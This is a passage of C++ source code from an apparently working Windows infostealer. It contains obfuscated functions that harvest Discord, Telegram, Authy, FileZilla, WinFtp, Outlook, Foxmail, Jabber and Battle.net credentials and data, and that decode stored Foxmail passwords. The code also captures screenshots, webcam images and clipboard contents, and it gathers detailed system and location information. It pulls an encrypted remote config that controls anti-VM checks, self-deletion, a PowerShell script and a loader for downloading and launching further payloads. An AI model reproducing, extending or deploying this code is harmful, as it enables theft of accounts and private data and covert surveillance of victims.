		bool group2 = CopyByMask(teleg_path, XOR("map*"), output_dir);

		bTeleg = group1 || group2;
	}
	catch (...) { return; }
}

void Stealing::GetDiscord(const string & output_dir)
{
	try
	{
		const string discord_path = (string)getenv(XorStr("AppData")) + XOR("\\discord\\Local Storage");
		if (File.dirInstance()->Exists(discord_path))
		{
			zip.addFolder(output_dir);
			bool group1 = CopyByMask(discord_path, XOR("https_discordapp.com*.localstorage"), output_dir);
			bool group2 = CopyByMask(discord_path + XOR("\\leveldb"), "*", output_dir);
			bDiscord = group1 || group2;
		}
	}
	catch (...) { return; }
}

void Stealing::GetFtpClient(const string & output_dir)
{
	try
	{
		const string filezilla = XOR("FileZilla");
		const string fzXmls[2] =
		{
			filezilla + '\\' + XOR("recentservers.xml"),
			filezilla + '\\' + XOR("sitemanager.xml")
		};

		const string appdata_path = (string)getenv(XOR("appdata")) + '\\';
		if (File.Exists(appdata_path + fzXmls[0]) ||
			File.Exists(appdata_path + fzXmls[1]))
			// сложно читаемый код, но на деле все просто. Если есть файлы то копируем
		{
			bFileZilla = true;
			zip.addFolder(filezilla);
			if (File.Exists(appdata_path + fzXmls[0]))
				zip.addFile(appdata_path + fzXmls[0], fzXmls[0]);
			if (File.Exists(appdata_path + fzXmls[1]))
				zip.addFile(appdata_path + fzXmls[1], fzXmls[1]);
		}

		string envVar = XOR("ProgramFiles(x86)");
		if (getenv(envVar.c_str()) == nullptr)
		{
			if (getenv(XOR("ProgramFiles")) != nullptr)
				envVar = getenv(XOR("ProgramFiles"));
		}
		else
			envVar = getenv(envVar.c_str());

		if (envVar != XOR("ProgramFiles(x86)"))
		{
			if (File.Exists(envVar + XOR("\\WinFtp Client\\Favorites.dat")))
			{
				bWinFtp = true;
				zip.addFolder(output_dir);
				zip.addFile(envVar + XOR("\\WinFtp Client\\Favorites.dat"), output_dir + XOR("\\Winftp.dat"));
			}
		}
	}
	catch (...) { return; }
}

void Stealing::GetOsu(const string & output_dir)
{
	try
	{
		const string osu_path = (string)getenv(XOR("localappdata")) + XOR("\\osu!\\osu!.db");
		if (File.Exists(osu_path))
		{
			zip.addFolder(output_dir);
			zip.addFile(osu_path, output_dir + XOR("\\osu_account.db"));
		}
	}
	catch (...) { return; }
}

void Stealing::GetAuthy(const string & output_dir)
{
	try
	{
		const string authy_path = (string)getenv(XOR("appdata")) + XOR("\\Authy Desktop\\Local Storage");
		WIN32_FIND_DATA data;
		HANDLE hFile = findFirstFileA((authy_path + XOR("\\*.localstorage")).c_str(), &data);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			zip.addFolder(output_dir);
			do
			{
				zip.addFile(authy_path + '\\' + data.cFileName, output_dir + '\\' + data.cFileName);
			} while (findNextFileA(hFile, &data));
			findClose(hFile);
		}
	}
	catch (...) { return; }
}

void Stealing::GetOutlook(const string & output_dir)
{
	try
	{
		string res = "";

		RunOutlookScan(XOR("Software\\Microsoft\\Office"), res);
		RunOutlookScan(XOR("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles"), res);
		RunOutlookScan(XOR("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles"), res);
		
		if (!res.empty())
		{
			zip.addFolder(output_dir);
			zip.addFileMemory(output_dir + XOR("\\Outlook.txt"), res);
		}
	}
	catch (...) { return; }
}

void Stealing::GetFoxmail(const string & output_dir)
{
	try
	{
		HKEY hKey;
		regOpenKeyA(HKEY_LOCAL_MACHINE, XOR("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command"), &hKey);

		if (hKey != nullptr)
		{
			string path = string();
			GetStringRegKeyA(hKey, string(), path, string());
			regCloseKey(hKey);

			if (!path.empty())
			{
				if (path.rfind('\\') != string::npos)
				{
					path = path.substr(1, path.rfind('\\'));
					path += XOR("Storage");

					WIN32_FIND_DATA data;
					HANDLE hFile = findFirstFileA((path + XOR("\\*@*")).c_str(), &data);

					if (hFile != INVALID_HANDLE_VALUE)
					{
						string output = string();
						do
						{
							if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
							{
								const string file_name = data.cFileName;
								if (file_name == "." || file_name == "..")
									continue;

								string eMail = file_name;
								if (!eMail.empty())
								{
									string content = string();
									ReadAllText(path + '\\' + file_name + XOR("\\Accounts\\Account.rec0"), content);

									if (!content.empty())
									{
										bool accfound = false, ver = !(content[0] == 0xD0);
										string buffer = string();

										for (int i = 0; i < content.size(); ++i)
										{
											if (content[i] > 0x20 && content[i] < 0x7F && content[i] != 0x3D)
											{
												buffer += content[i];

												string account = string();
												if (buffer == XOR("Account") || buffer == XOR("POP3Account"))
												{
													int index = i + 9;
													if (!ver)
														index = i + 2;

													while (content[index] > 0x20 && content[index] < 0x7F)
													{
														account += content[index];
														++index;
													}

													accfound = true;
													i = index;
												}
												else if (accfound && (buffer == XOR("Password") || buffer == XOR("POP3Password")))
												{
													int index = i + 9;
													if (!ver)
														index = i + 2;

													string password = string();
													while (content[index] > 0x20 && content[index] < 0x7F)
													{
														password += content[index];
														++index;
													}

													output += XOR("Email: ") + eMail + "\r\n";
													output += XOR("Password: ") + FoxmailDecode(ver, password) + "\r\n\r\n";

													i = index; // some questions
													break;
												}
											}
											else
												buffer = string();
										}
									}
								}
							}
						} while (findNextFileA(hFile, &data));
						findClose(hFile);

						if (!output.empty())
						{
							zip.addFolder(output_dir);
							zip.addFileMemory(output_dir + XOR("\\Foxmail.txt"), output);
						}
					}
				}
			}
		}
	}
	catch (...) { return; }
}

void Stealing::GetJabber(const string & output_dir)
{
	try
	{
		const string appdata = (string)getenv(XOR("appdata"));
		
		const string pidgin = XOR("\\.purple\\accounts.xml");
		const string psi_plus = XOR("\\Psi+\\profiles\\default\\accounts.xml");
		const string psi = XOR("\\Psi\\profiles\\default\\accounts.xml");

		if (File.Exists(appdata + pidgin) || File.Exists(appdata + psi_plus) || File.Exists(appdata + psi))
			zip.addFolder(output_dir);

		if (File.Exists(appdata + pidgin))
			zip.addFile(appdata + pidgin, output_dir + XOR("\\pidgin.xml"));

		if (File.Exists(appdata + psi))
			zip.addFile(appdata + psi, output_dir + XOR("\\psi.xml"));

		if (File.Exists(appdata + psi_plus))
			zip.addFile(appdata + psi_plus, output_dir + XOR("\\psi_plus.xml"));
	}
	catch (...) { return; }
}

void Stealing::GetBattleNetInformation(const string & output_dir)
{
	try
	{
		const string database_path = (string)getenv(XOR("localappdata")) + XOR("\\Battle.net\\CachedData.db");
		if (File.Exists(database_path))
		{
			bool b;
			SqlHandler* sql = new SqlHandler(database_path, b);
			if (b && sql->ReadTable(XOR("login_cache")))
			{
				zip.addFolder(output_dir);
				string res = XOR("Name: ") + sql->GetValue(0, 0)
					+ XOR("\r\nEnvironment: ") + sql->GetValue(0, 1)
					+ XOR("\r\nBattle tag: ") + sql->GetValue(0, 2);
				zip.addFileMemory(output_dir + XOR("\\BattleNetInfo.txt"), res);
				return;
			}
			delete sql;
		}
	}
	catch (...) { return; }
}

void Stealing::GetInstalledSoftware(const string & path, HKEY hDefault)
{
	try
	{
		string & information = browserVersion.output;
		size_t border = versions.size();

		if (!softwareCalled)
		{
			OSVERSIONINFOA osversion;
			ZeroMemory(&osversion, sizeof(OSVERSIONINFOA));
			osversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
			FNC(GetVersionExA, XOR("Kernel32.dll"))(&osversion);

			information += XOR("Windows Build Number: ") + std::to_string(osversion.dwBuildNumber) + "\r\n";
			information += XOR("Minor\\Major version: ") + std::to_string(osversion.dwMinorVersion)
				+ '\\' + std::to_string(osversion.dwMajorVersion) + "\r\n";
			information += XOR("\r\nInstalled software - version:\r\n");
		}

		HKEY key;
		regOpenKeyA(hDefault, path.c_str(), &key);
		if (key != nullptr)
		{
			char buff[1024];
			DWORD index = 0;

			LSTATUS stat = regEnumKeyA(key, index, buff, 1024);
			while (stat == ERROR_SUCCESS)
			{
				HKEY full_key;
				regOpenKeyA(HKEY_LOCAL_MACHINE, (path + '\\' + (string)buff).c_str(), &full_key);

				if (full_key != nullptr)
				{
					string name, version;
					GetStringRegKeyA(full_key, XOR("DisplayName"), name, "");
					GetStringRegKeyA(full_key, XOR("DisplayVersion"), version, "");
					if (!name.empty())
					{
						information += '\t' + name + '\t' + (version.empty() ? XOR("Unknown") : version) + "\r\n";
						if (!softwareCalled && name.find(XOR("Firefox")) != string::npos && !version.empty())
							versions.push_back(version);
					}
				}
				regCloseKey(full_key);

				++index;
				stat = regEnumKeyA(key, index, buff, 1024);
			}
			regCloseKey(key);
		}
		else
			information += XOR("\tEmpty");

		if (!softwareCalled)
		{
			information += XOR("\r\nGenerated user-agents: \r\n");

			BOOL is64proc;
			FNC(IsWow64Process, XorStr("Kernel32.dll"))((HANDLE)-1/*FNC(GetCurrentProcess, XorStr("Kernel32.dll"))()*/, &is64proc);

			for (size_t i = 0; i < versions.size(); ++i)
			{
				const string ver = versions[i];
				if (i >= border) // mozilla user-agents
					information += XOR("Mozilla/5.0 (Windows NT 10.0; ") + (is64proc ? XOR("Win64; x64; ") : string()) 
					+ XOR("rv:") + ver + XOR(") Gecko/20100101 Firefox/") + ver + "\r\n";
				else // chrome user-agents
					information += XOR("Mozilla/5.0 (Windows NT 10.0") + (is64proc ? XOR("; Win64; x64") : string()) 
					+ XOR(") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/") + ver + XOR(" Safari/537.36\r\n");
			}

			softwareCalled = true;
		}
	}
	catch (...) { return; }
}

void Stealing::GetInformation(const string & output_path, const string & hwid, unsigned int hash)
{
	string information = "";
	try
	{
		char* krnl = XOR("Kernel32.dll");
		char* usr = XOR("User32.dll");

		information += (string)VERSION + "\r\n\r\n";
		information += WATERMARK;

		information += XOR("\r\nPasswords: ") + std::to_string(passwords) + "\r\n";
		information += XOR("Cookies: ") + std::to_string(cookies) + "\r\n";
		information += XOR("Forms: ") + std::to_string(forms) + "\r\n";
		information += XOR("Cards: ") + std::to_string(cards) + "\r\n";
		information += (string)XOR("Wallets: ") + (bWallets ? '+' : '-') + "\r\n";
		information += (string)XOR("Steam: ") + (bSteam ? '+' : '-') + "\r\n";
		information += (string)XOR("Telegram: ") + (bTeleg ? '+' : '-') + "\r\n";
		information += (string)XOR("FileZilla: ") + (bFileZilla ? '+' : '-') + "\r\n";
		information += (string)XOR("WinFtp: ") + (bWinFtp ? '+' : '-') + "\r\n";
		information += (string)XOR("Discord: ") + (bDiscord ? '+' : '-') + "\r\n\r\n";

		information += XOR("User name: ") + File.getUserName() + "\r\n";
		information += XOR("HWID: ") + hwid + "\r\n";

		string machine_name = XOR("USERDOMAIN");
		if (getenv(machine_name.c_str()) == nullptr)
		{
			if (getenv(XOR("COMPUTERNAME")) != nullptr)
				machine_name = getenv(XOR("COMPUTERNAME"));
		}
		else
			machine_name = getenv(machine_name.c_str());
		information += XOR("Machine name: ") + machine_name + "\r\n";

		wchar_t* szwLocaleName = new wchar_t[LOCALE_NAME_MAX_LENGTH];
		char* szLocaleName = new char[LOCALE_NAME_MAX_LENGTH];
		FNC(GetUserDefaultLocaleName, krnl)(szwLocaleName, LOCALE_NAME_MAX_LENGTH);
		wcstombs(szLocaleName, szwLocaleName, LOCALE_NAME_MAX_LENGTH);
		delete szwLocaleName;
		information += XOR("System locale: ") + (string)szLocaleName + "\r\n";
		delete szLocaleName;

		information += XOR("Keyboard layouts: ");

		UINT uLayouts;
		HKL* lpList = NULL;
		char szBuf[512];

		uLayouts = FNC(GetKeyboardLayoutList, usr)(0, NULL);
		lpList = (HKL*)FNC(LocalAlloc, krnl)(LPTR, (uLayouts * sizeof(HKL)));
		uLayouts = FNC(GetKeyboardLayoutList, usr)(uLayouts, lpList);

		for (int i = 0; i < uLayouts; ++i)
		{
			FNC(GetLocaleInfoA, krnl)(MAKELCID(((UINT)lpList[i] & 0xffffffff), SORT_DEFAULT),
				LOCALE_SLANGUAGE, szBuf, XorInt(512));
			information += (string)szBuf;
			if (i != uLayouts - 1)
				information += XOR(" / ");
			memset(szBuf, 0, XorInt(512));
		}

		if (lpList)
			FNC(LocalFree, krnl)(lpList);

		information += XOR("\r\nUTC time: ");
		SYSTEMTIME systime, universaltime;
		FNC(GetSystemTime, krnl)(&systime);
		FNC(TzSpecificLocalTimeToSystemTime, krnl)(NULL, &systime, &universaltime);
		information += std::to_string(universaltime.wDay)
			+ '.' + std::to_string(universaltime.wMonth)
			+ '.' + std::to_string(universaltime.wYear)
			+ ' ' + std::to_string(universaltime.wHour)
			+ ':' + std::to_string(universaltime.wMinute) 
			+ ':' + std::to_string(universaltime.wSecond)
			+ '.' + std::to_string(universaltime.wMilliseconds);
			
		information += XOR("\r\nOS version: ");
		string os_version = "";
		HKEY key;
		regOpenKeyA(HKEY_LOCAL_MACHINE, XOR("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), &key);
		GetStringRegKeyA(key, XOR("ProductName"), os_version, XOR("Unknown"));
		os_version += ' ';
		regCloseKey(key);

		BOOL is64proc;
		FNC(IsWow64Process, krnl)((HANDLE)-1/*FNC(GetCurrentProcess, krnl)()*/, &is64proc);
		if (!is64proc)
			os_version += XOR("x32");
		else
			os_version += XOR("x64");
		windows_version = os_version;
		information += os_version + "\r\n\r\n";

		information += XOR("Current clipboard: ");
		char* buffer = (char*)"";
		if (FNC(OpenClipboard, usr)(0))
		{
			auto isClipboardFormat = FNC(IsClipboardFormatAvailable, XorStr("User32.dll"));
			if (isClipboardFormat(CF_TEXT))
			{
				buffer = (char*)FNC(GetClipboardData, usr)(CF_TEXT);
				string strBuffer = string(buffer);
				if (strBuffer.size() >= 150)
					strBuffer = strBuffer.substr(0, 95) + XOR("\r\n\t\t\t\t...");
				information += XOR("\r\n--------------\r\n") + strBuffer + XOR("\r\n--------------\r\n\r\n");
			}			
			else
				information += XOR("Unable to read\r\n\r\n");
		}
		else
			information += XOR("Unable to read\r\n\r\n");
		FNC(CloseClipboard, usr)();

		information += XOR("Startup folder: ") + File.ExePath() + "\r\n\r\n";

		string cpu_brand = "";
		GetCpu(cpu_brand);

		string processors_am = XOR("NUMBER_OF_PROCESSORS");
		if (getenv(processors_am.c_str()) == nullptr)
			processors_am = XOR("unable to get");
		else
			processors_am = getenv(processors_am.c_str());
		information += XOR("CPU info: ") + cpu_brand + XOR(" | Amount of kernels: ") + processors_am;
		information += XOR(" (Current CPU usage: ") + GetCpuUsage() + XOR("%)\r\n");

		HKEY hKey;
		regOpenKeyA(HKEY_LOCAL_MACHINE, XOR("HARDWARE\\DESCRIPTION\\System\\BIOS"), &hKey);
		if (hKey)
		{
			string boards = string();
			GetStringRegKeyA(hKey, XOR("BaseBoardProduct"), boards, string());
			information += XOR("Base board product: ") + boards + "\r\n";
			GetStringRegKeyA(hKey, XOR("SystemProductName"), boards, string());
			information += XOR("Product name: ") + boards + "\r\n";
			regCloseKey(hKey);
		}

		DISPLAY_DEVICEA dd;
		dd.cb = sizeof(DISPLAY_DEVICEA);
		FNC(EnumDisplayDevicesA, usr)(NULL, 0, &dd, EDD_GET_DEVICE_INTERFACE_NAME);
		information += XOR("GPU info: ") + string(dd.DeviceString) + "\r\n";

		MEMORYSTATUSEX memInfo;
		memInfo.dwLength = sizeof(MEMORYSTATUSEX);
		FNC(GlobalMemoryStatusEx, krnl)(&memInfo);
		information += XOR("Amount of RAM: ") + std::to_string((int)(memInfo.ullTotalPhys / 1073741824) + 1) +
			XOR(" GB (Current RAM usage: ") +
			std::to_string((memInfo.ullTotalPhys - memInfo.ullAvailPhys) / 1048576)
			+ XOR(" MB)\r\n");

		information += XOR("Screen resolution: ") +
			std::to_string(FNC(GetSystemMetrics, usr)(SM_CXSCREEN)) + 'x' +
			std::to_string(FNC(GetSystemMetrics, usr)(SM_CYSCREEN)) + "\r\n";
			
		information += XOR("\r\nComputer users:\r\n");

		string users_path = XOR("C:\\Users");
		if (getenv(XOR("SystemDrive")) != nullptr)
			users_path = (string)getenv(XOR("SystemDrive")) + XOR("\\Users");

		WIN32_FIND_DATA data;
		HANDLE hFiles = findFirstFileA((users_path + "\\*").c_str(), &data);
		if (hFiles != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					const string file_name = data.cFileName;
					if (file_name != "." && file_name != "..")
						information += file_name + "\r\n";
				}
			} while (findNextFileA(hFiles, &data));
			findClose(hFiles);
		}
		else
			information += XOR("unable to get\r\n");

		information += XOR("\r\nLogical drives: ");
		DWORD dwBitmask = FNC(GetLogicalDrives, krnl)();
		if (dwBitmask == 0)
			information += XOR("unable to resolve\r\n");
		else
		{
			string drive = XOR("A: ");
			while (dwBitmask != 0)
			{
				if (dwBitmask & 1)
					information += drive;
				++drive[0];
				dwBitmask >>= 1;
			}
		}

		information += "\r\n\r\n";

		information += XOR("City: ") + city + "\r\n";
		information += XOR("Country: ") + country + "\r\n";
		information += XOR("Coordinates: ") + lat + XOR(" N, ");
		information += lon + XOR(" E\r\n");
		information += XOR("IP: ") + ip + "\r\n";
		information += XOR("Timezone: ") + timeZone + "\r\n";
		information += XOR("Zip code: ") + zipCode + "\r\n";

		information += XOR("\r\nCompile time: ") + (string)XOR(__DATE__) + XOR("\r\n\r\n\r\n");
		information += (string)XOR("--- ID: ") + std::to_string(getDate()) + std::to_string(hash);

		zip.addFileMemory(output_path, information);
		return;
	}
	catch (...) { zip.addFileMemory(output_path, information); return; }
	zip.addFileMemory(output_path, information);
}

void Stealing::GetScreenShot()
{
	try
	{
		HDC hDc = FNC(GetDC, XOR("User32.dll"))(NULL);
		if (hDc)
		{
			ScreenshotRoutine routine = { zip, screenshotIndex };
			FNC(EnumDisplayMonitors, XOR("User32.dll"))(hDc, NULL, MonitorEnumProcCallback, (LPARAM)&routine);
		}
	}
	catch (...) { return; }
}

void Stealing::GetWebcamScreen(const string & output_path)
{
	try
	{
		HRESULT hr;
		ICreateDevEnum *pDevEnum = NULL;
		IEnumMoniker *pEnum = NULL;
		IMoniker *pMoniker = NULL;
		IPropertyBag *pPropBag = NULL;
		IGraphBuilder *pGraph = NULL;
		ICaptureGraphBuilder2 *pBuilder = NULL;
		IBaseFilter *pCap = NULL;
		IBaseFilter *pSampleGrabberFilter = NULL;
		ISampleGrabber *pSampleGrabber = NULL;
		IBaseFilter *pNullRenderer = NULL;
		IMediaControl *pMediaControl = NULL;
		char *pBuffer = NULL;

		int show_preview_window = 0;
		int list_devices = 0;
		int device_number = 1;
		char device_name[100];

		char char_buffer[100];

		strcpy(device_name, "");

		AM_MEDIA_TYPE mt;
		ZeroMemory(&mt, XorInt(sizeof(AM_MEDIA_TYPE)));

		hr = FNC(CoInitializeEx, XOR("Ole32.dll"))(NULL, COINIT_MULTITHREADED);
		if (hr == S_OK)
		{
			hr = FNC(CoCreateInstance, XOR("Ole32.dll"))(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);
			if (hr == S_OK)
			{
				hr = FNC(CoCreateInstance, XOR("Ole32.dll"))
					(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void **)&pBuilder);
				if (hr == S_OK)
				{
					hr = pBuilder->SetFiltergraph(pGraph);
					if (hr == S_OK)
					{
						hr = FNC(CoCreateInstance, XOR("Ole32.dll"))(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
						if (hr == S_OK)
						{
							hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
							if (hr == S_OK)
							{
								int n;

								bool fail = false;
								VARIANT var;
								n = 0;
								while (true)
								{
									// Access next device
									if (pEnum != 0)
										hr = pEnum->Next(1, &pMoniker, NULL);
									if (hr == S_OK)
										++n; // increment device count
									else
									{
										fail = true;
										break;
									}

									if (device_number == 0)
									{
										hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
										if (hr == S_OK)
										{
											FNC(VariantInit, XOR("OleAut32.dll"))(&var);
											hr = pPropBag->Read(XorStrW(L"FriendlyName"), &var, 0);
											
											sprintf(char_buffer, "%ls", var.bstrVal);
											FNC(VariantClear, XOR("OleAut32.dll"))(&var);
											pPropBag->Release();
											pPropBag = NULL;
											if (strcmp(device_name, char_buffer) == 0)
												break;
										}
										else
										{
											fail = true;
											break;
										}
									}
									else if (n >= device_number)
										break;
								}

								if (!fail)
								{
									hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
									FNC(VariantInit, XOR("OleAut32.dll"))(&var);
									hr = pPropBag->Read(XorStrW(L"FriendlyName"), &var, 0);
									FNC(VariantClear, XOR("OleAut32.dll"))(&var);

									hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
									if (hr == S_OK)
									{
										hr = pGraph->AddFilter(pCap, NULL);
										if (hr == S_OK)
										{
											hr = FNC(CoCreateInstance, XOR("Ole32.dll"))
												(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pSampleGrabberFilter);
											if (hr == S_OK)
											{
												hr = pSampleGrabberFilter->QueryInterface(IID_ISampleGrabber, (void**)&pSampleGrabber);
												if (hr == S_OK)
												{
													mt.majortype = MEDIATYPE_Video;
													mt.subtype = MEDIASUBTYPE_RGB32;

													hr = pSampleGrabber->SetBufferSamples(XorInt(TRUE));
													if (hr == S_OK)
													{
														hr = pSampleGrabber->SetMediaType((_AMMediaType*)&mt);
														if (hr == S_OK)
														{
															hr = pGraph->AddFilter(pSampleGrabberFilter, NULL);
															if (hr == S_OK)
															{
																hr = FNC(CoCreateInstance, XOR("Ole32.dll"))(CLSID_NullRenderer, NULL, 
																	CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullRenderer);
																if (hr == S_OK)
																{
																	hr = pGraph->AddFilter(pNullRenderer, NULL);
																	if (hr == S_OK)
																	{
																		hr = pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, pSampleGrabberFilter, pNullRenderer);
																		
																		if (hr == S_OK)
																		{
																			hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pMediaControl);
																			if (hr == S_OK)
																			{
																				while (1)
																				{
																					hr = pMediaControl->Run();
																					if (hr == S_OK)
																						break;
																					if (hr == S_FALSE)
																						continue;

																					fail = true;
																				}

																				if (!fail)
																				{
																					long buffer_size = 0;
																					while (1)
																					{
																						hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, NULL);

																						if (hr == S_OK && buffer_size != 0)
																							break;
																						if (hr != S_OK && hr != VFW_E_WRONG_STATE)
																						{
																							fail = true;
																							break;
																						}
																					}

																					if (!fail)
																					{
																						pMediaControl->Stop();
																						pBuffer = new char[buffer_size];
																						
																						if (pBuffer)
																						{
																							hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, (long*)pBuffer);
																							if (hr == S_OK)
																							{
																								hr = pSampleGrabber->GetConnectedMediaType((_AMMediaType *)&mt);
																								if (hr == S_OK)
																								{
																									VIDEOINFOHEADER *pVih = NULL;
																									if ((mt.formattype == FORMAT_VideoInfo) &&
																										(mt.cbFormat >= sizeof(VIDEOINFOHEADER)) &&
																										(mt.pbFormat != NULL))
																									{
																										pVih = (VIDEOINFOHEADER*)mt.pbFormat;

																										long cbBITMAPINFOSize = mt.cbFormat - SIZE_PREHEADER;
																										BITMAPFILEHEADER bfh;
																										ZeroMemory(&bfh, sizeof(bfh));
																										bfh.bfType = 'MB'; // Little-endian for "BM".
																										bfh.bfSize = sizeof(bfh) + buffer_size + cbBITMAPINFOSize;
																										bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + cbBITMAPINFOSize;

																										BYTE* buffer = (BYTE*)malloc(sizeof(bfh) + cbBITMAPINFOSize + buffer_size + 1);
																										memcpy(buffer, &bfh, sizeof(bfh));
																										memcpy(buffer + sizeof(bfh), HEADER(pVih), cbBITMAPINFOSize);
																										memcpy(buffer + sizeof(bfh) + cbBITMAPINFOSize, pBuffer, buffer_size);
																										buffer[sizeof(bfh) + cbBITMAPINFOSize + buffer_size] = '\0';

																										zip.addFileMemory(output_path, string((char*)buffer, sizeof(bfh) + cbBITMAPINFOSize + buffer_size));
																										free(buffer);

																										if (mt.cbFormat != 0)
																										{
																											FNC(CoTaskMemFree, XOR("Ole32.dll"))((PVOID)mt.pbFormat);
																											mt.cbFormat = 0;
																											mt.pbFormat = NULL;
																										}

																										if (mt.pUnk != NULL)
																										{
																											mt.pUnk->Release();
																											mt.pUnk = NULL;
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}

		if (pBuffer != NULL)
			delete[] pBuffer; 
		if (pMediaControl != NULL) 
			pMediaControl->Release();
		if (pNullRenderer != NULL) 
			pNullRenderer->Release();
		if (pSampleGrabber != NULL)
			pSampleGrabber->Release();
		if (pSampleGrabberFilter != NULL)
			pSampleGrabberFilter->Release();
		if (pCap != NULL)
			pCap->Release();
		if (pBuilder != NULL) 
			pBuilder->Release();
		if (pGraph != NULL)
			pGraph->Release();
		if (pPropBag != NULL)
			pPropBag->Release();
		if (pMoniker != NULL)
			pMoniker->Release();
		if (pEnum != NULL) 
			pEnum->Release();
		if (pDevEnum != NULL) 
			pDevEnum->Release(); 
		FNC(CoUninitialize, XOR("Ole32.dll"))();
		return;
	}
	catch (...) { return; }
}

void Stealing::CleanUp(const string & url)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);
		FNC(DeleteUrlCacheEntryA, XOR("Wininet.dll"))(url.c_str());
	}
	catch (...) { return; }
}

Grabber Stealing::GetSettings(const string & url, const string & query)
{
	grabber = { false, false, false, false, true, 0, false, false, false, vector<Rule>(), false, string(), false };
	// значения по умолчанию, можно задать абсолютно любые
	
	try
	{
		string settings = base64_decode(GetRequest(url, query));
		if (settings.empty())
		{
			grabber.iStatus = 2;
			return grabber;
		}

		RC4(settings, url);
		if (settings[0] != '[')
		{
			grabber.iStatus = 2;
			return grabber;
		}

		vector<string> config;
		if (splitBy(settings, '#', config))
		{
			vector<string> global;
			config[0] = config[0].substr(1).substr(0, config[0].size() - 2);
			if (splitBy(config[0], ';', global, true) && global.size() >= 11) // config size after split
			{
				grabber.bWebCam = BOOL_STR(global[0]);
				grabber.bAntiVm = BOOL_STR(global[1]);
				grabber.bSkype = BOOL_STR(global[2]);
				grabber.bSteam = BOOL_STR(global[3]);
				grabber.bScreenshot = BOOL_STR(global[4]);
				grabber.bSelfDelete = BOOL_STR(global[5]);
				grabber.bTelegram = BOOL_STR(global[6]);
				grabber.bWindowsCookie = BOOL_STR(global[7]);

				global[8] = trimStr(global[8], ' ');
				if (!global[8].empty() && isNumeric(global[8]))
					grabber.iSumFileSize = (unsigned int)str2ull(global[8]);
				else
					grabber.iSumFileSize = 0;
				grabber.powershellScript = base64_decode(global[9]);
				grabber.bHistory = BOOL_STR(global[10]);
			}
			global.clear();

			if (config[1] != XOR("[]"))
			{
				vector<string> raw_rules;
				config[1] = config[1].substr(1).substr(0, config[1].size() - 2); // deletes '[' and ']' symbols
				if (splitBy(config[1], ':', raw_rules))
				{
					for (size_t i = 0; i < raw_rules.size(); ++i)
					{
						const string query = raw_rules[i].substr(1).substr(0, raw_rules[i].size() - 2);
						vector<string> temp;
						if (splitBy(query, ';', temp, true) && temp.size() >= 5)
						{
							Rule rule;
							splitBy(temp[0], '|', rule.pathes);

							vector<string> vecPathes;
							for (string & str : rule.pathes)
							{
								bool ext = false;
								str = replaceEnvVar(str, &ext);
								if (ext)
								{
									DWORD dwLogicalDrives = FNC(GetLogicalDrives, XOR("Kernel32.dll"))();
									string drive = XOR("A:");
									string temp_query = string();
									size_t idx = str.find('\\');
									if (idx != string::npos)
										temp_query = str.substr(idx);
									while (dwLogicalDrives != 0)
									{
										if (dwLogicalDrives & 1)
										{
											if (drive[0] != 'C')
												vecPathes.push_back(drive + temp_query);
										}

										++drive[0];
										dwLogicalDrives >>= 1;
									}
								}
							}
							splitBy(trimStr(temp[1], ' '), ',', rule.extensions);

							temp[2] = trimStr(temp[2], ' ');
							if (!temp[2].empty() && isNumeric(temp[2]))
								rule.iMaxFileSize = (unsigned int)str2ull(temp[2]);
							else
								rule.iMaxFileSize = 0;
							splitBy(trimStr(temp[3], ' '), ',', rule.exceptions);
							rule.bRecursive = BOOL_STR(temp[4]);

							if (!vecPathes.empty())
							{
								for (string & pth : vecPathes)
									rule.pathes.push_back(pth);
							}

							grabber.rules.push_back(rule);
						}
					}
				}
				raw_rules.clear();
			}

			vector<string> internetData;
			config[2] = config[2].substr(1).substr(0, config[2].size() - 2);
			if (splitBy(config[2], ';', internetData, true) && internetData.size() >= 2) // TODO: Пиздец костыль конечно ну извините
			{
				city = internetData[0];
				country = trimStr(internetData[1], ' ');
				if (internetData.size() >= 7)
				{
					lat = internetData[2];
					lon = internetData[3];
					ip = internetData[4];
					timeZone = internetData[5];
					zipCode = internetData[6];
				}
			}
			internetData.clear();
			
			if (config[3] != XOR("[]"))
			{
				config[3] = config[3].substr(1).substr(0, config[3].size() - 2);
				vector<string> loader;
				if (splitBy(config[3], (char)XorInt((int)'|'), loader))
				{
					grabber.iStatus = 1;
					for (size_t i = 0; i < loader.size(); ++i)
					{
						const string query = loader[i].substr(1).substr(0, loader[i].size() - 2);
						if (query.empty())
							continue;
						vector<string> temp;
						if (splitBy(query, ';', temp, true) && temp.size() >= 12)
						{
							LoaderRule rule;
							rule.url = trimStr(temp[0], ' ');
							rule.launchType = (LaunchType)(str2ull(temp[1]) == 0 ? 1 : str2ull(temp[1]));
